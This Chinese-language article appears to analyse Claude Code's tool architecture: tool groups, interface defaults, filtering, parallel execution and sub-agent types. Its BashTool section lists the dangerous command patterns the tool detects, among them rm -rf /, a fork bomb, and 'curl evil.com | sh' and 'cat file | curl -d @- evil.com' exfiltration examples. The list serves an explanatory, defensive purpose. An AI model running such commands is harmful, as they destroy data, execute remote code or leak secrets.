# Source-Analysis / Tools

> 来源: claudecn.com

# 工具平面

Claude Code 能做什么——以及更重要的——它为什么这样做？43 个工具实体构成了系统的能力平面，它们不是随意堆叠的函数，而是一套有分组、有治理、有注册流程的能力体系。

**文档 + 可视化双窗口**：本文描述"为什么这样设计"，[Tools 可视化](https://code.claudecn.com/tools/) 提供"点击验证"。点击任意工具卡片可展开源码路径、参数和工作原理。

**这里的 43 不是“43 个用户可见按钮”。** 当前数字来自 `../src/tools/` 第一段路径的归一化分桶，因此会包含 `shared`、`testing`、`utils` 等基础设施桶。它反映的是工具系统的实体分布，不是纯粹的可调用工具清单。

## 工具全景

| 指标 | 数值 |
| --- | --- |
| 工具实体总数 | 43（source map 首段分桶） |
| 分组数 | 6 |
| 治理相关文件 | 216（含权限、Hook、沙箱） |
| 工具契约来源 | `sdk-tools.d.ts`（116KB 类型定义） |

## 工具系统全景图

```
执行层 → 治理层 → 过滤层 → 模型侧 → LLM 请求 tool_use → Feature Flag → Deny 规则 → MCP 合并 → PermissionMode → 规则匹配 → toolPermission Hook → Sandbox → StreamingToolExecutor → 只读工具 · 并行 → 写操作工具 · 串行
```

## 核心设计：工具优先架构
Claude Code 采用 **Tool-First** 架构——模型不直接执行操作，而是通过调用标准化的工具来完成任务。这不是简单的函数包装，而是一个深思熟虑的工程决策：

| 传统硬编码模式 | Tool-First 模式 |
| --- | --- |
| 功能耦合到 AI 行为逻辑 | 每个能力独立封装为工具 |
| 添加功能 = 修改核心代码 | 添加功能 = 注册新工具 |
| 无法细粒度控制能力 | 每个工具独立的权限、沙箱、并发策略 |
| 难以测试 | 每个工具可独立单测 |
| 模型看到固定功能 | 模型每次看到的工具集合是动态计算的 |

这个决策的源码证据在 `src/Tool.ts`（工具基类定义）和 `src/services/tools/toolOrchestration.ts`（编排层）。

## 六大分组

### 1. File Operations（8 工具，32 files）

围绕读写、编辑、搜索与工作区文件定位的基础能力。

| 工具 | 核心能力 | 关键设计 |
| --- | --- | --- |
| `FileReadTool` | 读取文件内容，支持行号范围 | `maxResultSizeChars = Infinity`——不截断 |
| `FileWriteTool` | 写入文件，创建或覆盖 | 全量替换，不做 merge |
| `FileEditTool` | 基于 old_string/new_string 的精确编辑 | 要求 old_string 唯一，支持 replace_all |
| `NotebookEditTool` | Jupyter Notebook 单元格编辑 | deferred 加载 |
| `GlobTool` | 文件名模式搜索 | readonly + parallel-safe |
| `GrepTool` | 基于 ripgrep 的内容搜索 | readonly + parallel-safe |
| `ToolSearchTool` | 搜索可用工具 | 发现 deferred 工具的唯一入口 |
| `BriefTool` | 简洁模式输出 | 渲染阶段工具 |

### 2. Execution & Shell（4 工具，35 files）

终端执行、Shell 控制、等待与只读校验等运行时操作。

| 工具 | 核心能力 | 安全特性 |
| --- | --- | --- |
| `BashTool` | Shell 命令执行 | **唯一受沙箱约束的工具**——macOS sandbox-exec / Linux bubblewrap |
| `PowerShellTool` | Windows PowerShell 执行 | 同安全模型 |
| `REPLTool` | 交互式 REPL 环境 | deferred 加载 |
| `SleepTool` | 等待指定时间 | readonly |

#### BashTool 多层防护深度剖析

BashTool 是安全设计最复杂的工具，因为它直接面对命令注入风险。源码显示一个四层安全体系：

**第一层：命令解析**——在执行前解析命令结构，提取实际执行的程序名和参数

**第二层：模式匹配**——内置危险模式库检测：

- rm -rf /、mkfs、dd if=、:(){ :|:& };:（fork bomb）
- Zsh 特性绕过：=curl evil.com → /usr/bin/curl evil.com
- 命令替换注入：$(curl evil.com | sh)
**第三层：语义分析**——理解命令意图：

- git push --force 识别为破坏性操作
- 环境变量泄露检测：echo $API_KEY
- 管道链分析：cat file | curl -d @- evil.com
**第四层：OS 级沙箱**

- macOS：sandbox-exec 限制进程系统调用
- Linux：bubblewrap + seccomp 容器级隔离
- 文件系统：可读/可写路径白名单
- 网络：域名白名单，阻止未授权外发
- 硬编码拒绝写入：settings.json、managed-settings、.claude/skills、Git 哨兵文件
### 3. Agents & Teams（5 工具，36 files）

子代理、消息发送、团队管理与技能装配。

| 工具 | 核心能力 | 设计要点 |
| --- | --- | --- |
| `AgentTool` | 子代理创建与执行 | 内建 6 种代理类型 |
| `SendMessageTool` | 向其他代理发送消息 | UDS 进程间通信 |
| `TeamCreateTool` | 创建持久化团队 | 独立 Git Worktree 隔离 |
| `TeamDeleteTool` | 删除团队 | 破坏性操作 |
| `SkillTool` | 技能调用入口 | 从注册表安装 SKILL.md |

#### 子代理系统深度剖析

AgentTool 不是简单地 fork 一个进程。它实现了一套完整的**代理类型系统**：

| 代理类型 | 工具集 | 模型 | 设计比喻 |
| --- | --- | --- | --- |
| `Explore` | 只读（Read, Glob, Grep, Bash） | Haiku（最快最便宜） | **侦察兵**——轻装上阵，跑得快 |
| `Plan` | 只读 | 主模型 | **参谋**——只看不动手 |
| `Verify` | 只读 | 主模型 | **审计员**——独立验证结果 |
| `GeneralPurpose` | 全部 | 主模型 | **全能兵**——完整权限 |
| `ClaudeCodeGuide` | 受限 | 主模型 | **导师**——引导操作 |
| `StatuslineSetup` | 受限 | 主模型 | **配置师**——设置环境 |

关键隔离机制：

- 每个子代理有独立的 agentId、AbortController 和工具白名单
- Explore Agent 显式设置 omitClaudeMd: true——跳过加载 CLAUDE.md 以节省 token
- 权限模式 permissionMode: 'bubble'——子代理的权限请求冒泡到父级处理
- 同步/异步两种执行模式——后台任务通过 registerAsyncAgent() 注册并返回 task ID
### 4. Planning & Workflows（13 工具，44 files）

计划模式、任务读写、定时触发、worktree 切换等流程控制能力。

| 工具 | 核心能力 |
| --- | --- |
| `EnterPlanModeTool` | 进入只读计划模式 |
| `ExitPlanModeTool` | 退出计划模式 |
| `TodoWriteTool` | 任务清单管理 |
| `TaskCreateTool` | 创建后台任务 |
| `TaskGetTool` / `TaskListTool` / `TaskUpdateTool` / `TaskOutputTool` / `TaskStopTool` | 任务生命周期管理 |
| `ScheduleCronTool` / `RemoteTriggerTool` | 定时与远程触发 |
| `EnterWorktreeTool` / `ExitWorktreeTool` | Git Worktree 隔离 |

### 5. External Systems（10 工具，33 files）

Web、MCP、LSP 与用户问答等外部能力接入。

| 工具 | 核心能力 | 设计要点 |
| --- | --- | --- |
| `WebFetchTool` | HTTP 请求与页面抓取 | 隔离服务器执行，不支持 localhost |
| `WebSearchTool` | Web 搜索 | 返回摘要 + 来源 URL |
| `MCPTool` | MCP 服务器工具调用 | 动态命名 `mcp____` |
| `McpAuthTool` | MCP 认证 | OAuth 流程支持 |
| `ListMcpResourcesTool` / `ReadMcpResourceTool` | MCP 资源管理 | 只读数据访问 |
| `LSPTool` | Language Server Protocol 交互 | 代码定义、引用、诊断 |
| `AskUserQuestionTool` | 向用户提问 | 阻塞式等待用户响应 |
| `ConfigTool` | 配置读写 | 关联 `/config` 命令 |
| `SyntheticOutputTool` | 合成输出 | 内部流程控制，不可直接调用 |

### 6. Infrastructure（3 模块，4 files）

工具系统内部的共享设施、测试框架与辅助函数。

## 工具接口：统一契约

所有工具通过 `Tool.ts` 定义的统一类型注册，关键属性如下（直接来自 `src/Tool.ts` 第 362–480 行）：

| 属性 | 默认值 | 设计意图 |
| --- | --- | --- |
| `isReadOnly()` | **`false`** | 默认假设有写操作——失败安全 |
| `isConcurrencySafe()` | **`false`** | 默认不能并发——避免竞态 |
| `isDestructive()` | `false` | 标记不可逆操作 |
| `shouldDefer` | — | 延迟加载，需通过 ToolSearch 发现 |
| `alwaysLoad` | — | 即使延迟加载也始终出现 |
| `interruptBehavior()` | `block` | 用户发新消息时：取消还是等待 |
| `maxResultSizeChars` | — | 结果超限持久化到磁盘 |

**关键哲学**：`isReadOnly` 和 `isConcurrencySafe` 的默认值都是 `false`（最严格）。这是**失败安全（fail-safe）**设计——如果工具开发者忘了设置属性，系统会按最保守的方式运行，宁可慢也不出错。

## 工具到达模型前的三层过滤

工具不是全部直接暴露给模型。在 `query()` 主循环每次迭代中，工具列表经过三层过滤：

- Feature Flag 过滤：isEnabled() 返回 false 的工具被静默移除
- 权限 Deny 规则过滤：配置中显式禁用的工具在到达模型前就被移除
- MCP 工具合并：外部 MCP 服务器注册的工具动态合并到工具列表中
过滤后的工具列表才会序列化为 API 请求中的 `tools` 参数。这说明模型每次看到的可用工具集合不是固定的——这是 Claude Code 区别于静态配置 AI 工具的关键。

## 并行工具执行

`StreamingToolExecutor`（`src/services/tools/StreamingToolExecutor.ts`）支持在 API 响应流式到达时并行启动工具执行：

- isConcurrencySafe 返回 true 的工具可以并行执行
- isReadOnly 为 true 的只读工具天然可并行
- 写操作工具默认串行执行，避免文件冲突
- toolOrchestration.ts 中的 runTools() 负责调度
这意味着模型在一次响应中可以同时发起多个文件读取，但写入操作会被排队——一个在工程上很成熟的并发策略。

## 对 Agent 开发者的启示

| 设计原则 | Claude Code 实践 | 你可以借鉴 |
| --- | --- | --- |
| 默认最严格 | 所有安全属性默认 `false` | 新工具先用最保守配置，逐步放开 |
| 工具可组合 | 模型自由组合多工具完成复杂任务 | 设计小粒度工具，让 AI 编排 |
| 动态工具集 | 每次查询的工具列表动态计算 | 根据上下文和权限动态调整能力面 |
| 子代理分工 | Explore 用快模型、Plan 只看不动 | 不同任务用不同模型和权限组合 |
| 沙箱隔离 | Shell 执行有 OS 级沙箱 | 高风险操作必须有隔离机制 |

## 建议阅读顺序

- 命令表面 — 看用户如何触发这些工具
- 架构概览 — 理解工具在整体架构中的位置
- 扩展与信号 — 看 MCP 和 skills 如何扩展能力面
